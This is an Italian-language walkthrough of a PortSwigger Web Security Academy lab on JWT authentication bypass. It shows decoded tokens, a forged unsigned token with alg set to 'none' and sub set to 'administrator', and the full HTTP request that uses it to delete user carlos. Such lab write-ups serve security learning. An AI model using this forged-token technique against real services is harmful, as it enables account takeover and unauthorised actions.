
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification

Logghiamoci con utente `wiener` e password: `peter`

Ecco il nostro token:

```
Cookie: session=eyJraWQiOiJjYTBjNTA3My04NTYyLTQxM2YtYTE5MC0wZDJkN2ExODU1MjciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Mzk0OTk5NSwic3ViIjoid2llbmVyIn0.WnsU9OAdakwCwjTYmMNyheUYiR6l6_KITERY5ml3ZVWGk00QMmf-IfXC3dAbf9NtrJJWVB8Iia4lH8V9JK0uHSbUOWOVlVMaVJ7_iKq4LA_vPeTX9uE-EROyCIqOBeiZNOhsWPKvyJ3nTnzUVxNjYIF_MR9WJ-uNEdOSgw4nfWAoJ9ElaZ2oxkcvyGgl4F9Id4VHHTTKpiEM35RyAUS2vfRpLgCTSsdDHh6hL9ub0HxjJwtzicpC_tqgfrP-FAgEX3enziwJSYa6R5ybTBnEdtJv46EzKZgma7u03tJ3fe0iOaAW71oAiN4ZGN4LAKusULy-aa0fOpP1dNoQpReWTg
```


```
=====================
Decoded Token Values:
=====================

Token header values:
[+] kid = "ca0c5073-8562-413f-a190-0d2d7a185527"
[+] alg = "RS256"

Token payload values:
[+] iss = "portswigger"
[+] exp = 1743949995    ==> TIMESTAMP = 2025-04-06 16:33:15 (UTC)
[+] sub = "wiener"

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

Sostituiamo `wiener` con `administrator`

Otteniamo un 401 Unauthorized.

Proviamo allora ad impostare la signature su `None` tramite il plugin JWT Editor di Burpsuite:

![](_attachment/Pasted%20image%2020250406153700.png)



risposta

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3165
```

Troviamo nel body il link per cancellare l'utente `carlos`


```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a1900950395848b81826c7600500011.web-security-academy.net
Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Mzk0OTk5NSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

risposta:

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

![](_attachment/Pasted%20image%2020250406153814.png)

